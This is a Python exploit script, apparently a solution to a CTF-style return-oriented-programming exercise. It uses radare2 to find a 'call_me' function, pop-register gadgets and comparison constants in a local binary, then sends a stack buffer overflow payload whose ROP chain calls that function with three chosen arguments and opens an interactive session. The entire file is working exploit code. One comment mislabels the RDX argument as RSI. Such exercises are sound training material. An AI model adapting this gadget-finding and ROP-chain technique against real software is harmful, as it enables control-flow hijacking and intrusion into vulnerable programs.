import r2pipe
import json
from pwn import *

CALL_ME = 0x00400580

PRDI_RET = 0x00400683
PRSI_PR15_RET = 0x00400681
PRDX_RET = 0x0040057b

ARG1 = 0x11223344
ARG2 = 0x55667788
ARG3 = 0x11335577

APP = "./main"

# Load file
r2 = r2pipe.open(APP)
r2.cmd('aaaa')  # Analysis
symbols = json.loads(r2.cmd('isj'))
for i in symbols:
    if i['type'] == 'FUNC' and i['name'] == 'call_me':
        CALL_ME = i['vaddr']
        print("call_me find on {}".format(hex(CALL_ME)))
        break


PRDI_RET = PRSI_PR15_RET = PRDX_RET = None
rops = json.loads(r2.cmd('/Rj pop rdi'))
if not isinstance(rops, (list, tuple)):
    rops = [rops]
for r in rops:
    if (
            len(r['opcodes']) >= 2 and
            r['opcodes'][-1]['opcode'] == 'ret' and
            r['opcodes'][-2]['opcode'] == 'pop rdi'
    ):
        PRDI_RET = r['opcodes'][-2]['offset']
        print("Rop RDI on {}".format(hex(PRDI_RET)))
        break

rops = json.loads(r2.cmd('/Rj pop rdx'))
if not isinstance(rops, (list, tuple)):
    rops = [rops]
for r in rops:
    if (
            len(r['opcodes']) >= 2 and
            r['opcodes'][-1]['opcode'] == 'ret' and
            r['opcodes'][-2]['opcode'] == 'pop rdx'
    ):
        PRDX_RET = r['opcodes'][-2]['offset']
        print("Rop RDX on {}".format(hex(PRDX_RET)))
        break

rops = json.loads(r2.cmd('/Rj pop rsi'))
if not isinstance(rops, (list, tuple)):
    rops = [rops]
for r in rops:
    if (
            len(r['opcodes']) >= 3 and
            r['opcodes'][-1]['opcode'] == 'ret' and
            r['opcodes'][-2]['opcode'] == 'pop r15' and
            r['opcodes'][-3]['opcode'] == 'pop rsi'
    ):
        PRSI_PR15_RET = r['opcodes'][-3]['offset']
        print("Rop RSI/R15 on {}".format(hex(PRSI_PR15_RET)))
        break

r2.cmd('s {}'.format(hex(CALL_ME)))
ARG1 = ARG2 = ARG3 = None
raw_code = json.loads(r2.cmd('pdfj'))
for opcode in raw_code['ops']:
    if opcode['type'] == 'cmp':
        if not ARG1:
            ARG1 = opcode['val']
            print("arg1 {}".format(hex(opcode['val'])))
        elif not ARG2:
            ARG2 = opcode['val']
            print("arg2 {}".format(hex(opcode['val'])))
        elif not ARG3:
            ARG3 = opcode['val']
            print("arg3 {}".format(hex(opcode['val'])))

#s = process("./main")

# Uncomment for debugging
s = process(APP)
#gdb.attach(s, 'b*0x004005f2')

payload = 'A'*128
payload += 'BBBBBBBB' # RBP
payload += p64(PRDI_RET) # RET to GADGET
payload += p64(ARG1) # RDI Param1

payload += p64(PRSI_PR15_RET) # RET to GADGET
payload += p64(ARG2) # RSI Param2
payload += p64(0x0) # R15

payload += p64(PRDX_RET) # RET to GADGET
payload += p64(ARG3) # RSI Param2

payload += p64(CALL_ME) # RET

payload += '\n'
s.send(payload)
print(s.recv())
s.interactive()
s.close()